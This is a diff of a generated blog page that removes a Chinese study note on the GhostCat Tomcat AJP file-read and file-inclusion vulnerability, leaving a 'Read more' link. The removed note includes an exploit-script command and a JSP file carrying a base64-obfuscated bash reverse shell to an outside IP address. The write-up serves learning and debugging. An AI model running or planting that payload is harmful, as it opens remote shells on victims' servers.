@@ -181,7 +181,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2021-11-13 13:14:29 / Modified: 17:22:22" itemprop="dateCreated datePublished" datetime="2021-11-13T13:14:29+08:00">2021-11-13</time>
+              <time title="Created: 2021-11-13 13:14:29 / Modified: 17:23:47" itemprop="dateCreated datePublished" datetime="2021-11-13T13:14:29+08:00">2021-11-13</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -207,121 +207,14 @@
           <blockquote>
 <p>本文主要参考 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_31481187/article/details/105917392">https://blog.csdn.net/qq_31481187/article/details/105917392</a> 和 <a target="_blank" rel="noopener" href="https://paper.seebug.org/1142/#_6">https://paper.seebug.org/1142/#_6</a> ，并无原创内容，仅仅是个人学习笔记。</p>
 </blockquote>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>官网对AJP协议的介绍如下</p>
-<blockquote>
-<p>The <strong>AJP Connector</strong> element represents a  <strong>Connector</strong> component that communicates with a web  connector via the <code>AJP</code> protocol.  This is used for cases  where you wish to invisibly integrate Tomcat into an existing (or new)  Apache installation, and you want Apache to handle the static content  contained in the web application, and/or utilize Apache’s SSL  processing.</p>
-</blockquote>
-<p><a target="_blank" rel="noopener" href="https://blog.hillpig.top/apache-tomcat-nginx/">https://blog.hillpig.top/apache-tomcat-nginx/</a> 中提到了AJP协议的使用场景，可以参考一下。</p>
-<p>该漏洞主要是由于Tomcat 对从AJP协议传来的数据没有正确解析，导致攻击者可以控制以下三个参数</p>
-<ul>
-<li>javax.servlet.include.request_uri</li>
-<li>javax.servlet.include.path_info</li>
-<li>javax.servlet.include.servlet_path</li>
-</ul>
-<p>在tomcat目录下的conf/web.xml中，规定了两种servlet，分别用于处理默认类型的文件（比如静态资源）和JSP类型的路径请求。</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>default<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.catalina.servlets.DefaultServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>debug<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>0<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>listings<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>jsp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.jasper.servlet.JspServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>fork<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>xpoweredBy<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>3<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>map规则</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- The mapping for the default servlet --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>default<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- The mappings for the JSP servlet --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>jsp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jspx<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>两种servlet导致了两个漏洞：DefaultSevlet导致了文件读取，JspServlet导致了代码执行，后者是以文件包含的形式执行的，因此要利用首先需要在目标服务器上上传文件。通过控制url访问路径，可以选择触发这两种servlet中的任意一种。</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本文漏洞调试在arch linux下进行，其他系统在环境变量设置上有所差异，自行调整。</p>
-<p>首先需要安装 java 8，在arch linux 下执行如下命令即可</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S jdk8-openjdk</span><br></pre></td></tr></table></figure>
-
-<p>如果事先安装了其他版本的java，在安装jdk8之后可以通过以下命令切换默认java版本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo archlinux-java set java-8-openjdk</span><br></pre></td></tr></table></figure>
-
-<p>然后下载tomcat8和源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.30/bin/apache-tomcat-8.5.30.zip</span><br><span class="line">wget https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.30/src/apache-tomcat-8.5.30-src.zip</span><br></pre></td></tr></table></figure>
-
-<p>将两个都解压，第一个是用来运行tomcat的，第二个是用来在IDEA里面调试的，调试的原理和php的remote debug类似。这里通过5005端口来进行调试通信</p>
-<p>打开第一个文件夹里面的bin/catalina.sh，加入以下代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export JAVA_OPTS=&#x27;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>然后设置以下的环境变量，这里我将第一个文件解压出来的东西放在了/usr/local/tomcat/下面。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># for tomcat debug</span><br><span class="line">export JAVA_HOME=/usr/lib/jvm/java-8-openjdk</span><br><span class="line">export JRE_HOME=$JAVA_HOME/jre</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin</span><br><span class="line">export CATALINA_HOME=/usr/local/tomcat/apache-tomcat-8.5.30</span><br><span class="line">export CLASSPATH=$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JAVA_HOME/lib:$CATALINA_HOME/lib</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin:$CATALINA_HOME/bin</span><br></pre></td></tr></table></figure>
-
-<p>执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./catalina.sh start </span><br></pre></td></tr></table></figure>
-
-<p>访问浏览器8080端口可以看到tomcat默认页面说明搭建成功。</p>
-<p>然后用IDEA打开第二个文件夹中的java目录。添加配置</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113142502055.png" alt="image-20211113142502055"></p>
-<p>下断点，运行debug，然后运行exp脚本，开始调试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f WEB-INF/web.xml 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a>漏洞调试</h2><h3 id="文件读取漏洞"><a href="#文件读取漏洞" class="headerlink" title="文件读取漏洞"></a>文件读取漏洞</h3><p>这里使用wireshark来抓取exp发出的流量。</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113143147373.png" alt="image-20211113143147373"></p>
-<p>可以看到AJP协议请求中包含了结尾的三个键值对，并且请求的是/asdf路径，因此处理这个请求的是DefaultServlet。</p>
-<p>在<code>org.apache.coyote.ajp.AjpProcessor#service</code>中的<code>prepareRequest</code>打下断点，让程序运行到此，步进。</p>
-<p>在prepareRequest函数里面的for循环中获取了几个特定的请求头信息，然后到这里</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113145700194.png" alt="image-20211113145700194"></p>
-<p>步进</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113150356416.png" alt="image-20211113150356416"></p>
-<p>这里mb还是Upgrade-Insecure-Requests，再步进</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113150710953.png" alt="image-20211113150710953"></p>
-<p>到这里mb的值没变，然后再往下</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113150748292.png" alt="image-20211113150748292"></p>
-<p>变成了攻击的配置项，看看setBytes函数里面做了什么</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113151042858.png" alt="image-20211113151042858"></p>
-<p>看看b的值</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113152429398.png" alt="image-20211113152429398"></p>
-<p>是请求体，然后off的值是255，len的值是33。setBytes函数中对几个变量进行了设置，这里start和end中间的那段字符串就是<code>javax.servlet.include.request_uri</code>。</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113153716357.png" alt="image-20211113153716357"></p>
-<p>然后返回，接下来同样的方法读取了值</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113154708867.png" alt="image-20211113154708867"></p>
-<p>设置</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113154801961.png" alt="image-20211113154801961"></p>
-<p>其他两个配置项都是同样的读取方式，这里不再赘述。到此位置prepareRequest()函数分析完成</p>
-<hr>
-<p>回到prepareRequest函数所在的位置，继续往下</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113155216081.png" alt="image-20211113155216081"></p>
-<p>将请求交给了service函数，步进，一直到这里</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113155811748.png" alt="image-20211113155811748"></p>
-<p>步进，继续调可以看到wrapper选择了DefaultServlet</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113160344440.png" alt="image-20211113160344440"></p>
-<p>继续，一直到DefaultServlet#doGet方法。</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113160613367.png" alt="image-20211113160613367"></p>
-<p>request携带着攻击配置项进入了serveResource中，步进，一直到getRelativePath函数，发现这里在尝试获取request请求中的<code>javax.servlet.include.request_uri</code>。</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113161327282.png" alt="image-20211113161327282"></p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113161255693.png" alt="image-20211113161255693"></p>
-<p>进入if判断之后又紧接着获取了<code>javax.servlet.include.path_info</code> 和 <code>javax.servlet.include.servlet_path</code> 两个属性，然后在下面进行了拼接返回</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113162336349.png" alt="image-20211113162336349"></p>
-<p>回到DefaultServlet#serveResource， 在这里获取文件资源</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113162524740.png" alt="image-20211113162524740"></p>
-<p>步进，发现会做一个path的验证</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113162608850.png" alt="image-20211113162608850"></p>
-<p>步进validate，发现这里进行了一个normalize操作</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113162726068.png" alt="image-20211113162726068"></p>
-<p>这两个while循环不允许path中出现<code>./</code>和<code>../</code>，会将其替换为空，也就是说文件读取漏洞是不能穿透到上层目录读取的。</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113162826441.png" alt="image-20211113162826441"></p>
-<p>返回到StandarRoot#getResource方法，步进到cache.getResource中</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113163421942.png" alt="image-20211113163421942"></p>
-<p>在这里，获取到了对应web路径下的文件内容并最终返回结果，至此文件读取漏洞分析完毕。</p>
-<h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>首先在webapps下面写一个文件，后缀名随意</p>
-<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    java.io.InputStream in = Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtYyAnc2ggLWkgJj4vZGV2L3RjcC8zOS4xMDUuMTc2LjM3LzEyMzM0IDA+JjEn&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>).getInputStream();</span><br><span class="line">    <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">    <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">        out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>然后exp里面需要修改这部分</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113165621018.png" alt="image-20211113165621018"></p>
-<p>为</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113165639432.png" alt="image-20211113165639432"></p>
-<p>这样才可以让请求被JspServlet处理。这之后进入<code>org.apache.jasper.servlet.JspServlet</code>，直接在service方法中下断点。运行exp开始调试，跳过前面的prepareRequest环节后，来到这里</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113171213281.png" alt="image-20211113171213281"></p>
-<p>这里和之前一样也获取了<code>javax.servlet.include.path_info</code>等属性，然后进入serviceJspFile方法</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113171440245.png" alt="image-20211113171440245"></p>
-<p>生成了wrapper对象，然后调用了<code>wrapper.service</code>方法，继续调试，看到JspServletWrapper的service方法中调用了getServlet()</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113171851877.png" alt="image-20211113171851877"></p>
-<p>继续往下就可以看到这里了，代码执行成功。</p>
-<p><img src="/home/ch4ser/Documents/hexo/source/images/GhostCat/image-20211113171934381.png" alt="image-20211113171934381"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>恶意配置项是如何被解析的，其实还是不是很清楚。另外有必要了解一下servlet的执行过程了。</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/11/13/GhostCat/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
